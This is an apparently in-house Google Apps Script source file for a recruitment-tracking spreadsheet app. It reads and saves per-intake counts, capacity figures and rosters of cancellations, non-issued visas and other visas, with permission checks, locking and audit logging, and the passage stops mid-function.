// ⚠️ THE RULE, and it lives in exactly one place.
//   blank 入学期  -> a LEGACY row: belongs to every intake
//   set   入学期  -> belongs to that intake alone
// Every row written before the column existed is blank, which is why switching the country
// list to per-intake needed no migration: on day one each intake still sees exactly the list
// it saw before, and nothing could half-land on a live sheet.
// ⚠️ 地域 resolves per NAME across ALL rows, never per row. Per-intake rows each carry a
// 地域 cell, so reading it off the matched row would let one country sit in 南アジア for one
// intake and 欧米・その他 for another — and the grid groups by it.
function _recCountriesFor_(rows, intake) {
  const want = String(intake == null ? "" : intake).trim();
  let region = {}, out = [], seen = {};
  (rows || []).forEach(function (r) {
    if (r.region && !region[r.name]) region[r.name] = r.region;
  });
  (rows || []).forEach(function (r) {
    if (r.intake !== "" && r.intake !== want) return;
    if (seen[r.name]) return;
    seen[r.name] = 1;
    out.push({ name: r.name, region: region[r.name] || "" });
  });
  return out;
}

// Every intake the selector can show: Recruitment_DB ∪ Recruitment_Capacity ∪ meta, newest
// first. ⚠️ Not meta's "intake" rows alone — an intake can exist purely because numbers were
// entered against it, and materialising without it would strip every country from it.
function _recAllIntakes_() {
  const data  = _getRecruitmentSheet_().getDataRange().getDisplayValues();
  const cData = _getRecruitCapSheet_().getDataRange().getDisplayValues();
  let out = _recruitIntakeList_(data, cData);          // already sorted newest-first
  _recruitMetaLists_(null).intakes.forEach(function (i) { if (out.indexOf(i) === -1) out.push(i); });
  out.sort(function (a, b) {
    const ka = _recIntakeSortKey_(a), kb = _recIntakeSortKey_(b);
    return ka !== kb ? kb - ka : String(a).localeCompare(String(b), "ja");
  });
  return out;
}

// Expand the legacy blank-入学期 country rows into one explicit row per intake, then drop
// them. Idempotent — a no-op once none remain.
//
// ⚠️ WRITE PATH ONLY. getRecruitmentBundle runs for anyone holding view_recruitment, so a
// silent write from a read would either be refused or land under the wrong caller. Every
// caller here is already permission-gated. The read only ever INTERPRETS a blank row.
//
// ⚠️ Why it has to happen at all: a per-intake delete cannot be expressed while the row is
// shared. Removing 「ネパール」 from one intake would have to remove it from all of them.
// ⚠️ The 入学期 header only lands when the SHEET is created, and every live project already
// has this sheet — so on staging and production column E would carry values under a blank
// header. Reads are unaffected (a missing cell is undefined, which reads as legacy, which is
// correct), but an unlabelled column in a sheet staff open by hand is how a column gets
// "tidied up". Write paths only, for the same reason materialisation is.
function _recEnsureMetaHeader_(sh, rows) {
  try {
    // ⚠️ Read off the rows the caller already has. Its own getRange().getDisplayValue()
    // was a second round trip to a sheet that had just been read in full, on every save.
    const hdr = (rows && rows[0]) ? String(rows[0][4] || "").trim() : "";
    if (hdr === "") sh.getRange(1, 5).setValue("入学期");
  } catch (e) { /* labelling is cosmetic; never fail a save over it */ }
}

// ⚠️ Takes the caller's already-read rows and RETURNS the rows to carry on with — re-read
// only when it actually changed the sheet. It used to read the data range itself and the
// caller read it again immediately afterwards, so an ordinary 国名 delete made THREE full
// reads of one small sheet (this one, the header probe, and the caller's).
function _recMaterialiseLegacyCountries_(sh, rows) {
  const data = rows || sh.getDataRange().getDisplayValues();
  _recEnsureMetaHeader_(sh, data);
  let legacy = [], have = {};
  for (let i = 1; i < data.length; i++) {
    if (String(data[i][0]).trim() !== "country") continue;
    const v = String(data[i][1] || "").trim();
    if (v === "") continue;
    const it = String(data[i][4] || "").trim();
    if (it === "") legacy.push({ row: i, name: v, region: String(data[i][2] || "").trim() });
    else have[v + "\u0000" + it] = 1;
  }
  // ⚠️ Checked BEFORE _recAllIntakes_, which costs two more sheet reads. This runs on an
  // ordinary 国名設定 edit and does real work exactly once.
  if (!legacy.length) return data;      // untouched — the caller reuses what it passed in

  const intakes = _recAllIntakes_();
  try { _snapshotSheet_(SHEET_RECRUIT_META); } catch (e) {}
  let add = [];
  legacy.forEach(function (l) {
    intakes.forEach(function (it) {
      const key = l.name + "\u0000" + it;
      if (have[key]) return;              // an explicit row already covers this pair
      have[key] = 1;
      add.push(_cellSafeRow_(["country", l.name, l.region, "", it]));
    });
  });
  // Appending does not shift the rows above it, so the indexes captured above stay valid.
  if (add.length) sh.getRange(sh.getLastRow() + 1, 1, add.length, 5).setValues(add);
  // ⚠️ Bottom-up: deleteRow shifts every row below it.
  legacy.map(function (l) { return l.row; })
        .sort(function (a, b) { return b - a; })
        .forEach(function (r) { sh.deleteRow(r + 1); });
  return sh.getDataRange().getDisplayValues();   // the sheet moved; hand back the truth
}

// Grid data for one intake: counts keyed "コース||国名||募集担当者", plus capacity.
// A blank intake means "no filter" and returns every intake's counts — the most
// expensive result there is. The view only ever wants one intake, so it used to
// take that payload, discard it, and immediately re-fetch scoped to the newest
// intake: two round trips where one would do. Pass resolveBlank to have the
// server pick the newest itself and report it back as resolvedIntake. The intake
// list is built from the same two reads either way, so this costs nothing extra.
function getRecruitmentData(role, perms, intake, resolveBlank, pre) {
  if (!_hasRecruitPerm_(role, perms, "view_recruitment")) throw new Error("権限がありません");
  // One batched read for all six tabs; null means the advanced service isn't
  // available and each consumer reads its own sheet as it used to.
  const batch = pre || _recruitBatchValues_();
  const data  = batch ? batch.db  : _getRecruitmentSheet_().getDataRange().getDisplayValues();
  const cData = batch ? batch.cap : _getRecruitCapSheet_().getDataRange().getDisplayValues();

  // The intake list is derived from every row regardless of filter, so it has to
  // be built BEFORE `want` is applied — that's what makes resolving a blank
  // intake possible in this same pass.
  const meta = _recruitMetaLists_(batch ? batch.meta : null);
  let intakes = _recruitIntakeList_(data, cData);
  meta.intakes.forEach(function(i){ if (intakes.indexOf(i) === -1) intakes.push(i); });
  const _ikey = _recIntakeSortKey_;
  // Chronological, newest first — parsed so 10月 sorts after 7月 rather than
  // beside 1月 as a plain text compare would.
  const _icmp = function(a, b){
    const ka = _ikey(a), kb = _ikey(b);
    if (ka !== kb) return kb - ka;
    return String(a).localeCompare(String(b), "ja");
  };
  intakes.sort(_icmp);

  let want = String(intake == null ? "" : intake).trim();
  // Sorted newest-first above, so [0] is the intake the view would have landed
  // on anyway. With no intakes at all `want` stays blank and behaves as before.
  if (want === "" && resolveBlank && intakes.length) want = intakes[0];

  let counts = {};
  for (let i = 1; i < data.length; i++) {
    const it = String(data[i][1] || "").trim();
    if (it === "") continue;
    if (want !== "" && it !== want) continue;
    const n = parseInt(String(data[i][5]).replace(/,/g, ""), 10);
    if (isNaN(n) || n === 0) continue;
    counts[_recKey_(data[i][2], data[i][3], data[i][4])] = n;
  }

  let capacity = {}, lastYear = {}, countryQuota = {};
  for (let i = 1; i < cData.length; i++) {
    const it = String(cData[i][0] || "").trim();
    const co = String(cData[i][1] || "").trim();
    if (it === "" || co === "") continue;
    if (want !== "" && it !== want) continue;
    const nat = String(cData[i][4] || "").trim();
    const n = parseInt(String(cData[i][2]).replace(/,/g, ""), 10);
    if (nat !== "") {
      // Country-specific 定員 for the grid (コース||国名).
      if (!isNaN(n)) countryQuota[co + "||" + nat] = n;
      continue;
    }
    capacity[co] = isNaN(n) ? 0 : n;
    const ly = parseInt(String(cData[i][3] || "").replace(/,/g, ""), 10);
    if (!isNaN(ly)) lastYear[co] = ly;
  }

  return { counts: counts, capacity: capacity, lastYear: lastYear, countryQuota: countryQuota, intakes: intakes,
           // ⚠️ `want`, not the raw argument — a blank intake resolves to the newest above,
           // and the country list has to follow the intake the grid actually shows.
           addedCountries: _recCountriesFor_(meta.countries, want),
           recruiters: meta.recruiters, regions: meta.regions,
           otherVisa: _getOtherVisaRows_(want, batch ? batch.visa : null),
           cancels: _getCancelRows_(want, batch ? batch.cancel : null),
      notIssued: _getNotIssuedRows_(want, batch ? batch.notissued : null),
           resolvedIntake: want };
}

function _recruitIntakeList_(data, cData) {
  let seen = {}, out = [];
  const push = v => { const s = String(v || "").trim(); if (s && !seen[s]) { seen[s] = 1; out.push(s); } };
  for (let i = 1; i < data.length; i++) push(data[i][1]);
  for (let i = 1; i < cData.length; i++) push(cData[i][0]);
  out.sort((a, b) => { const ka = _recIntakeSortKey_(a), kb = _recIntakeSortKey_(b);
                      return ka !== kb ? kb - ka : String(a).localeCompare(String(b), "ja"); });
  return out;
}

// Upsert ONE grid cell (intake+course+nationality+recruiter -> count).
// Writing 0 or blank removes the row, so the sheet stays free of empty noise.
function saveRecruitmentCount(role, perms, intake, course, nationality, recruiter, count, actorName, actorId) {
  if (!_hasRecruitPerm_(role, perms, "edit_recruitment")) throw new Error("権限がありません");
  const it = String(intake || "").trim();
  const co = String(course || "").trim();
  const nat = String(nationality || "").trim();
  const rec = String(recruiter || "").trim();
  if (it === "" || co === "") throw new Error("入学期とコースは必須です。");

  let n = parseInt(String(count).replace(/,/g, ""), 10);
  if (isNaN(n) || n < 0) n = 0;

  const sh = _getRecruitmentSheet_();
  const data = sh.getDataRange().getDisplayValues();
  let found = -1;
  for (let i = 1; i < data.length; i++) {
    if (String(data[i][1]).trim() === it &&
        String(data[i][2]).trim() === co &&
        String(data[i][3]).trim() === nat &&
        String(data[i][4]).trim() === rec) { found = i + 1; break; }
  }

  if (n === 0) {
    // ⚠️ Zeroing a cell DELETES its row. Its recovery is triggerScheduledBackup's copy
    // (3×/day) — the per-flush copy this used to take was seconds on every cell save.
    if (found > 0) sh.deleteRow(found);
    return { saved: true, count: 0 };
  }
  if (found > 0) {
    sh.getRange(found, 6).setValue(n);
    sh.getRange(found, 7).setValue(actorName || "");
  } else {
    sh.appendRow([new Date(), it, co, nat, rec, n, actorName || ""]);
  }
  return { saved: true, count: n };
}

function saveRecruitmentCapacity(role, perms, intake, course, capacity, actorName, actorId, field, nationality) {
  if (!_hasRecruitPerm_(role, perms, "manage_recruitment")) throw new Error("権限がありません");
  const it = String(intake || "").trim(), co = String(course || "").trim();
  if (it === "" || co === "") throw new Error("入学期とコースは必須です。");
  const n = parseInt(String(capacity).replace(/,/g, ""), 10);
  const val = isNaN(n) ? "" : n;

  const nat = String(nationality || "").trim();   // "" = course-level row
  const sh = _getRecruitCapSheet_();
  const data = sh.getDataRange().getDisplayValues();
  let found = -1;
  for (let i = 1; i < data.length; i++) {
    if (String(data[i][0]).trim() === it &&
        String(data[i][1]).trim() === co &&
        String(data[i][4] || "").trim() === nat) { found = i + 1; break; }
  }
  const col = (String(field || "") === "lastYear") ? 4 : 3;   // 3=定員, 4=前年実績
  if (found > 0) sh.getRange(found, col).setValue(val);
  else {
    let row = [it, co, "", "", nat];
    row[col - 1] = val;
    sh.appendRow(row);
  }
  try { _logActivity_({ role: role, name: actorName || "", id: actorId || "" }, (col === 4 ? "前年実績を設定" : "定員を設定"), it + " / " + co, String(val)); } catch (e) {}
  return { saved: true };
}


// ---- 募集状況: ONE round trip for a whole editing session -----------------
//
// Every input in 募集状況 used to write as it was typed — a ~1s round trip per
// field (§8's measured floor), and a 定員 edit additionally refetched the whole
// bundle on top. The screen now holds edits until the user presses 保存, and this
// is where the whole session lands, in one call.
//
// ⚠️ It DISPATCHES to the seven existing savers rather than reimplementing them.
// Each of those owns its own permission check, its positional column map
// (tests/visacolumns.test.js), its _cellSafe_ wrapping, its _logActivity_ line and,
// for saveRecruitmentCount, the throttled snapshot tests/damagecontrol.test.js
// pins. A second copy of any of that is this file's oldest bug class wearing a
// performance argument.
//
// ⚠️ The floor check is edit_recruitment because that is the weakest thing any op
// needs. capacity / note / dates need manage_recruitment, and the function each of
// those dispatches to still enforces it — one permission decision per kind, still
// in the place it already lived. Do NOT collapse this into one blanket check, or an
// edit_recruitment user gets 定員 by slipping a capacity op into the array.
const REC_BATCH_MAX = 500;

// ⚠️ A SECOND COPY of each cell saver's column map, which is precisely the
// positional-drift bug class tests/visacolumns.test.js exists for. It is a list of
// FIELD NAMES rather than positions, so a mismatch fails loudly ("項目が不正です")
// instead of writing under the wrong heading — but a column added to a saver and not
// here would simply never be written on a new row, silently. tests/recsave.test.js
// asserts these match the savers' `cols` keys in both directions.
const REC_ADD_FIELDS = {
  visa: ["no", "nationality", "name", "visa", "visaDesired", "course", "incharge", "matsuno", "fee"],
  cancel: ["nationality", "name", "course", "incharge"],
  notissued: ["nationality", "name", "course", "incharge"],
};

// A row added in the browser reaches the sheet here, whole: append first (which is
// where the lock, the 番号 and the row index come from), then write each field
// through the same per-cell saver an edit to an existing row would use.
//
// ⚠️ 番号 is assigned by addOtherVisaRow inside its lock. A value the user typed
// overrides it — the rule the old optimistic-add path recorded as "user typed —
// theirs wins" — and an empty one leaves the server's number alone.
function _recAddRowWithFields_(kind, added, writeCell, role, perms, op, actorName, actorId) {
  const sheetRow = added.sheetRow;
  const fields = op.fields || {};
  REC_ADD_FIELDS[kind].forEach(function (f) {
    const v = fields[f];
    if (v === undefined || v === null || String(v) === "") return;
    writeCell(role, perms, sheetRow, f, v, actorName, actorId);
  });
  return { added: true, sheetRow: sheetRow, no: added.no };
}

function saveRecruitmentBatch(role, perms, intake, ops, actorName, actorId) {
  if (!_hasRecruitPerm_(role, perms, "edit_recruitment")) throw new Error("権限がありません");
  // A non-array here means the browser and the server disagree about the payload,
  // which no user can act on — hence a code rather than an instruction.
  if (!ops || typeof ops.length !== "number" || typeof ops === "string") {
    throw new Error("保存する内容を読み取れませんでした。（REC-01）");
  }
  if (ops.length > REC_BATCH_MAX) {
    throw new Error("一度に保存できる件数を超えました。少しずつ保存してください。");
  }

  let results = [], okCount = 0, failCount = 0;
  for (let i = 0; i < ops.length; i++) {
    // ⚠️ Per-op try/catch. One rejected cell must never abandon the other twenty:
    // the client clears exactly the inputs that saved and leaves the rest marked,
    // and it can only do that from a POSITIONAL result array.
    try {
      // The saver's own return travels back with the result — 連絡事項's carries the
      // stamp and author its status line prints, and on a partly-failed batch there
      // is no reload to fetch that a second time.
      const out = _saveRecruitmentOp_(role, perms, intake, ops[i] || {}, actorName, actorId);
      results.push({ ok: true, value: out || null });
      okCount++;
    } catch (e) {
      results.push({ ok: false, error: String((e && e.message) || e) });
      failCount++;
    }
  }
  return { results: results, okCount: okCount, failCount: failCount };
}

// The dispatch table. Argument ORDER is the contract with each saver — note that
// actorName/actorId sit in the middle of saveRecruitmentCapacity and
// saveRecruitmentDates, not at the end.
function _saveRecruitmentOp_(role, perms, intake, op, actorName, actorId) {
  switch (String(op.t || "")) {
    case "count":
      return saveRecruitmentCount(role, perms, intake, op.course, op.nationality, op.recruiter, op.count, actorName, actorId);
    case "capacity":
      return saveRecruitmentCapacity(role, perms, intake, op.course, op.capacity, actorName, actorId, op.field, op.nationality);
    case "cancel":
      return saveCancelCell(role, perms, op.rowIndex, op.field, op.value, actorName, actorId);
    case "visa":
      return saveOtherVisaCell(role, perms, op.rowIndex, op.field, op.value, actorName, actorId);
    case "notissued":
      return saveNotIssuedCell(role, perms, op.rowIndex, op.field, op.value, actorName, actorId);
    case "note":
      return saveRecruitmentNote(role, perms, intake, op.html, actorName, actorId);
    case "dates":
      return saveRecruitmentDates(role, perms, intake, op.listDate, op.applyDate, op.resultDate, actorName, actorId, op.charge);

    // ---- whole-row adds. The browser holds these locally until 保存, so the row and
    // its fields arrive together and nothing exists in the sheet until this runs.
    case "addvisa":
      return _recAddRowWithFields_("visa",
        addOtherVisaRow(role, perms, intake, actorName, actorId),
        saveOtherVisaCell, role, perms, op, actorName, actorId);
    case "addcancel":
      return _recAddRowWithFields_("cancel",
        addCancelRow(role, perms, intake, op.kind, actorName, actorId),
        saveCancelCell, role, perms, op, actorName, actorId);
    case "addnotissued":
      return _recAddRowWithFields_("notissued",
        addNotIssuedRow(role, perms, intake, actorName, actorId),
        saveNotIssuedCell, role, perms, op, actorName, actorId);
  }
  // An unrecognised kind is one failed row, not a dead batch — the caller catches.
  // Same cause as the check above, so the same code.
  throw new Error("保存する内容を読み取れませんでした。（REC-01）");
}


// ---- 留学ビザ以外（変更も含む）: free-form roster kept per intake.
function _getOtherVisaSheet_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sh = ss.getSheetByName(SHEET_RECRUIT_VISA);
  if (!sh) {
    sh = ss.insertSheet(SHEET_RECRUIT_VISA);
    sh.appendRow(["入学期", "番号", "国籍", "名前", "現在のビザ", "ビザ変更", "課程", "担当", "松野", "学費"]);
    sh.setFrozenRows(1);
  }
  return sh;
}

// ---- One-time migration: add ビザ変更 to Recruitment_OtherVisa ----
// Run once from the Apps Script editor AFTER deploying, on each spreadsheet
// (staging and production have separate copies).
//
// Idempotent: it keys off the header, so running it twice does nothing. It
// snapshots first, and uses insertColumnAfter so Sheets shifts 課程/担当/松野/学費
// right WITH their data rather than us moving values by hand.
//
// ⚠️ The code above already expects the new layout, so 課程 onwards will read one
// column to the left until this has run. Deploy and migrate together.
function migrateOtherVisaAddDesiredColumn() {
  _requireMaintenanceUnlock_("migrateOtherVisaAddDesiredColumn");
  const sh = _getOtherVisaSheet_();
  const lastCol = Math.max(sh.getLastColumn(), 1);
  const headers = sh.getRange(1, 1, 1, lastCol).getDisplayValues()[0];

  // Final state — nothing to do.
  if (headers.indexOf("ビザ変更") !== -1) {
    return "already migrated — " + sh.getLastColumn() + " columns, nothing to do";
  }

  // The column was named 変更希望ビザ when this migration first shipped. A sheet
  // that already ran it needs a RENAME, not another insert — without this branch
  // the check above would miss and we would add a second column.
  const renamed = headers.indexOf("変更希望ビザ");
  if (renamed !== -1) {
    sh.getRange(1, renamed + 1).setValue("ビザ変更");
    SpreadsheetApp.flush();
    return "renamed 変更希望ビザ -> ビザ変更 (column " + (renamed + 1) + ")";
  }

  // Fresh sheet: insert the column. insertColumnAfter shifts 課程/担当/松野/学費
  // right WITH their data, so no values are moved by hand.
  _snapshotSheet_(SHEET_RECRUIT_VISA);
  sh.insertColumnAfter(5);
  sh.getRange(1, 5).setValue("現在のビザ");
  sh.getRange(1, 6).setValue("ビザ変更");
  SpreadsheetApp.flush();
  const after = sh.getRange(1, 1, 1, sh.getLastColumn()).getDisplayValues()[0];
  return "migrated. headers now: " + after.join(" | ");
}

function _getOtherVisaRows_(intake, pre) {
  const data = pre || _getOtherVisaSheet_().getDataRange().getDisplayValues();
  const want = String(intake == null ? "" : intake).trim();
  let out = [];
  for (let i = 1; i < data.length; i++) {
    const it = String(data[i][0] || "").trim();
    if (it === "") continue;
    if (want !== "" && it !== want) continue;
    out.push({
      _sheetRow: i + 1, intake: it,
      no: String(data[i][1] || ""), nationality: String(data[i][2] || ""),
      name: String(data[i][3] || ""), visa: String(data[i][4] || ""),
      visaDesired: String(data[i][5] || ""),
      course: String(data[i][6] || ""), incharge: String(data[i][7] || ""),
      matsuno: String(data[i][8] || ""), fee: String(data[i][9] || "")
    });
  }
  return out;
}

// Add a blank row for the selected intake (the grid is then edited in place).
function addOtherVisaRow(role, perms, intake, actorName, actorId) {
  if (!_hasRecruitPerm_(role, perms, "edit_recruitment")) throw new Error("権限がありません");
  const it = String(intake || "").trim();
  if (it === "") throw new Error("入学期を選択してください。");
  // Read-highest-then-append has to be atomic. Two quick adds otherwise both read
  // the same highest 番号 and assign it twice, and both see the same getLastRow,
  // which would point two rows at one sheet row and send cell edits to the wrong
  // one. Since the client can now add without waiting, this races easily.
  const lock = LockService.getScriptLock();
  try { lock.waitLock(15000); }
  catch (e) { throw new Error("処理が混み合っています。もう一度お試しください。"); }
  try {
    const sh = _getOtherVisaSheet_();
    // Next 番号 within this intake.
    const existing = _getOtherVisaRows_(it);
    let maxNo = 0;
    existing.forEach(function(r){ const n = parseInt(r.no, 10); if (!isNaN(n) && n > maxNo) maxNo = n; });
    sh.appendRow([it, maxNo + 1, "", "", "", "", "", "", "", ""]);
    // The client adds the row optimistically and needs the real row index to send
    // subsequent cell edits to; flush so getLastRow reflects the append.
    SpreadsheetApp.flush();
    return { added: true, sheetRow: sh.getLastRow(), no: maxNo + 1 };
  } finally {
    lock.releaseLock();
  }
}

// Update one field of one row (auto-save per cell).
function saveOtherVisaCell(role, perms, rowIndex, field, value, actorName, actorId) {
  if (!_hasRecruitPerm_(role, perms, "edit_recruitment")) throw new Error("権限がありません");
  const cols = { no: 2, nationality: 3, name: 4, visa: 5, visaDesired: 6, course: 7, incharge: 8, matsuno: 9, fee: 10 };
  const col = cols[String(field || "")];
  if (!col) throw new Error("項目が不正です。");
  const sh = _getOtherVisaSheet_();
  const ri = parseInt(rowIndex, 10);
  if (isNaN(ri) || ri < 2 || ri > sh.getLastRow()) throw new Error("対象の行が見つかりません。");
  sh.getRange(ri, col).setValue(String(value == null ? "" : value));
  return { saved: true };
}

function deleteOtherVisaRow(role, perms, rowIndex, actorName, actorId) {
  if (!_hasRecruitPerm_(role, perms, "edit_recruitment")) throw new Error("権限がありません");
  const sh = _getOtherVisaSheet_();
  const ri = parseInt(rowIndex, 10);
  if (isNaN(ri) || ri < 2 || ri > sh.getLastRow()) throw new Error("削除対象の行が見つかりません。");
  const row = sh.getRange(ri, 1, 1, 4).getDisplayValues()[0];
  const gone = _sheetRowForLog_(sh, ri);
  sh.deleteRow(ri);
  try { _logActivity_({ role: role, name: actorName || "", id: actorId || "" }, "留学ビザ以外を削除", (row[0] || "") + " / " + (row[3] || ""), gone); } catch (e) {}
  return { deleted: true };
}


// ---- キャンセル roster: one row per cancelled applicant, tagged by 種別
// (申請キャンセル / 申請取り下げ / COE後キャンセル), scoped to an intake.
function _getCancelSheet_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sh = ss.getSheetByName(SHEET_RECRUIT_CANCEL);
  if (!sh) {
    sh = ss.insertSheet(SHEET_RECRUIT_CANCEL);
    sh.appendRow(["入学期", "種別", "国籍", "名前", "課程", "担当"]);
    sh.setFrozenRows(1);
  }
  _ensureCancelColumns_(sh);
  return sh;
}

// 担当 was added after the sheet was in use, and it is what a cancellation is
// subtracted BY — a row without it counts against nobody. Widened on demand for
// the reason recorded on _ensureAccountColumns_: relying on a migration having run
// first turns a deploy-ordering slip into silently wrong totals.
function _ensureCancelColumns_(sheet) {
  try {
    if (sheet.getMaxColumns() < CANCEL_COLS) {
      sheet.insertColumnsAfter(sheet.getMaxColumns(), CANCEL_COLS - sheet.getMaxColumns());
    }
    const cell = sheet.getRange(1, CANCEL_COLS);
    if (String(cell.getDisplayValue() || "").trim() === "") cell.setValue("担当");
  } catch (e) { /* best-effort; an un-widenable sheet surfaces at the write */ }
}

function _getCancelRows_(intake, pre) {
  const data = pre || _getCancelSheet_().getDataRange().getDisplayValues();
  const want = String(intake == null ? "" : intake).trim();
  let out = [];
  for (let i = 1; i < data.length; i++) {
    const it = String(data[i][0] || "").trim();
    if (it === "" || (want !== "" && it !== want)) continue;
    out.push({
      _sheetRow: i + 1,
      kind: String(data[i][1] || "").trim(),
      nationality: String(data[i][2] || ""),
      name: String(data[i][3] || ""),
      course: String(data[i][4] || ""),
      // Absent on pre-widen rows, which read as undefined -> "". That is the
      // correct fallback: unattributed, and surfaced by the callout rather than
      // silently subtracted from someone.
      incharge: String(data[i][5] || "")
    });
  }
  return out;
}

function addCancelRow(role, perms, intake, kind, actorName, actorId) {
  if (!_hasRecruitPerm_(role, perms, "edit_recruitment")) throw new Error("権限がありません");
  const it = String(intake || "").trim();
  const k = String(kind || "").trim();
  if (it === "" || k === "") throw new Error("入学期と種別は必須です。");
  // Locked for the same reason as addOtherVisaRow: concurrent appends would both
  // report the same getLastRow, pointing two rows at one sheet row.
  const lock = LockService.getScriptLock();
  try { lock.waitLock(15000); }
  catch (e) { throw new Error("処理が混み合っています。もう一度お試しください。"); }
  try {
    const sh = _getCancelSheet_();
    sh.appendRow([it, k, "", "", ""]);
    // See addOtherVisaRow: the optimistic client needs the real row index back.
    SpreadsheetApp.flush();
    return { added: true, sheetRow: sh.getLastRow() };
  } finally {
    lock.releaseLock();
  }
}

function saveCancelCell(role, perms, rowIndex, field, value, actorName, actorId) {
  if (!_hasRecruitPerm_(role, perms, "edit_recruitment")) throw new Error("権限がありません");
  // ⚠️ Positional, and the mirror of _getCancelRows_' 0-based read. They drift
  // silently — a mismatch writes under the wrong heading and never errors.
  // tests/visacolumns.test.js asserts the pair.
  const cols = { nationality: 3, name: 4, course: 5, incharge: 6 };
  const col = cols[String(field || "")];
  if (!col) throw new Error("項目が不正です。");
  const sh = _getCancelSheet_();
  const ri = parseInt(rowIndex, 10);
  if (isNaN(ri) || ri < 2 || ri > sh.getLastRow()) throw new Error("対象の行が見つかりません。");
  const before = sh.getRange(ri, col).getDisplayValue();
  sh.getRange(ri, col).setValue(String(value == null ? "" : value));
  // 課程 / 国籍 / 担当 decide which cell this cancellation comes off, so changing one
  // moves the grid. Worth a line in the log for the same reason the delete is.
  try { _logActivity_({ role: role, name: actorName || "", id: actorId || "" },
                     "キャンセルを編集", String(field || ""),
                     String(before || "(空)") + " → " + String(value == null ? "" : value)); } catch (e) {}
  return { saved: true };
}

function deleteCancelRow(role, perms, rowIndex, actorName, actorId) {
  if (!_hasRecruitPerm_(role, perms, "edit_recruitment")) throw new Error("権限がありません");
  const sh = _getCancelSheet_();
  const ri = parseInt(rowIndex, 10);
  if (isNaN(ri) || ri < 2 || ri > sh.getLastRow()) throw new Error("削除対象の行が見つかりません。");
  // ⚠️ Was the only destructive action in the app with neither a backup nor an audit
  // entry. Since キャンセル rows subtract from the grid, deleting one moves real numbers
  // back up. Its recovery is the whole row, in 操作履歴 — see _rowForLog_.
  const gone = sh.getRange(ri, 1, 1, CANCEL_COLS).getDisplayValues()[0];
  const full = _sheetRowForLog_(sh, ri);
  sh.deleteRow(ri);
  try { _logActivity_({ role: role, name: actorName || "", id: actorId || "" },
                     "キャンセルを削除", (gone[0] || "") + " / " + (gone[1] || ""), full); } catch (e) {}
  return { deleted: true };
}

// ---- 不交付 -----------------------------------------------------------------
//
// Same roster shape as キャンセル minus 種別, and a DIFFERENT meaning: see the note
// on SHEET_RECRUIT_NOTISSUED. Only 定員・残枠 moves.
function _getNotIssuedSheet_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sh = ss.getSheetByName(SHEET_RECRUIT_NOTISSUED);
  if (!sh) {
    sh = ss.insertSheet(SHEET_RECRUIT_NOTISSUED);
    sh.appendRow(["入学期", "国籍", "名前", "課程", "担当"]);
    sh.setFrozenRows(1);
  }
  _ensureNotIssuedColumns_(sh);
  return sh;
}

// Widened on demand for the reason recorded on _ensureCancelColumns_: relying on a
// migration having run first turns a deploy-ordering slip into silently wrong
// totals.
function _ensureNotIssuedColumns_(sheet) {
  try {
    if (sheet.getMaxColumns() < NOTISSUED_COLS) {
      sheet.insertColumnsAfter(sheet.getMaxColumns(), NOTISSUED_COLS - sheet.getMaxColumns());
    }
    const cell = sheet.getRange(1, NOTISSUED_COLS);
    if (String(cell.getDisplayValue() || "").trim() === "") cell.setValue("担当");
  } catch (e) { /* best-effort; an un-widenable sheet surfaces at the write */ }
}

function _getNotIssuedRows_(intake, pre) {
  const data = pre || _getNotIssuedSheet_().getDataRange().getDisplayValues();
  const want = String(intake == null ? "" : intake).trim();
  let out = [];
  for (let i = 1; i < data.length; i++) {
    const it = String(data[i][0] || "").trim();
    if (it === "" || (want !== "" && it !== want)) continue;
    out.push({
      _sheetRow: i + 1,
      nationality: String(data[i][1] || ""),
      name: String(data[i][2] || ""),
      // ⚠️ 課程 is the ONLY field the subtraction needs — it names the 定員・残枠
      // row. A row without it counts against nothing and is surfaced by the
      // summary's warning rather than silently dropped.
      course: String(data[i][3] || ""),
      incharge: String(data[i][4] || "")
    });
  }
  return out;
}

function addNotIssuedRow(role, perms, intake, actorName, actorId) {
  if (!_hasRecruitPerm_(role, perms, "edit_recruitment")) throw new Error("権限がありません");
  const it = String(intake || "").trim();
  if (it === "") throw new Error("入学期は必須です。");
  // Locked for the same reason as addCancelRow: concurrent appends would both
  // report the same getLastRow, pointing two rows at one sheet row.
  const lock = LockService.getScriptLock();
  try { lock.waitLock(15000); }
  catch (e) { throw new Error("処理が混み合っています。もう一度お試しください。"); }
  try {
    const sh = _getNotIssuedSheet_();
    sh.appendRow(_cellSafeRow_([it, "", "", "", ""]));
    // The optimistic client needs the real row index back.
    SpreadsheetApp.flush();
    return { added: true, sheetRow: sh.getLastRow() };
  } finally {
    lock.releaseLock();
  }
}

function saveNotIssuedCell(role, perms, rowIndex, field, value, actorName, actorId) {
  if (!_hasRecruitPerm_(role, perms, "edit_recruitment")) throw new Error("権限がありません");
  // ⚠️ Positional, and the mirror of _getNotIssuedRows_' 0-based read. They drift
  // silently — a mismatch writes under the wrong heading and never errors.
  // tests/visacolumns.test.js asserts the pair.
  const cols = { nationality: 2, name: 3, course: 4, incharge: 5 };
  const col = cols[String(field || "")];
  if (!col) throw new Error("項目が不正です。");
  const sh = _getNotIssuedSheet_();
  const ri = parseInt(rowIndex, 10);
  if (isNaN(ri) || ri < 2 || ri > sh.getLastRow()) throw new Error("対象の行が見つかりません。");
  const before = sh.getRange(ri, col).getDisplayValue();
  sh.getRange(ri, col).setValue(_cellSafe_(String(value == null ? "" : value)));
  // 課程 decides which 定員・残枠 row this comes off, so changing it moves a real
  // number. Worth a line in the log for the same reason the delete is.
  try { _logActivity_({ role: role, name: actorName || "", id: actorId || "" },
                     "不交付を編集", String(field || ""),
                     String(before || "(空)") + " → " + String(value == null ? "" : value)); } catch (e) {}
  return { saved: true };
}

function deleteNotIssuedRow(role, perms, rowIndex, actorName, actorId) {
  if (!_hasRecruitPerm_(role, perms, "edit_recruitment")) throw new Error("権限がありません");
  const sh = _getNotIssuedSheet_();
  const ri = parseInt(rowIndex, 10);
  if (isNaN(ri) || ri < 2 || ri > sh.getLastRow()) throw new Error("削除対象の行が見つかりません。");
  // ⚠️ Logged WITH its contents. A 不交付 row subtracts from 定員・残枠, so deleting one
  // moves 合計 and 残枠 back up; the whole row in 操作履歴 is what puts it back.
  const gone = sh.getRange(ri, 1, 1, NOTISSUED_COLS).getDisplayValues()[0];
  const full = _sheetRowForLog_(sh, ri);
  sh.deleteRow(ri);
  try { _logActivity_({ role: role, name: actorName || "", id: actorId || "" },
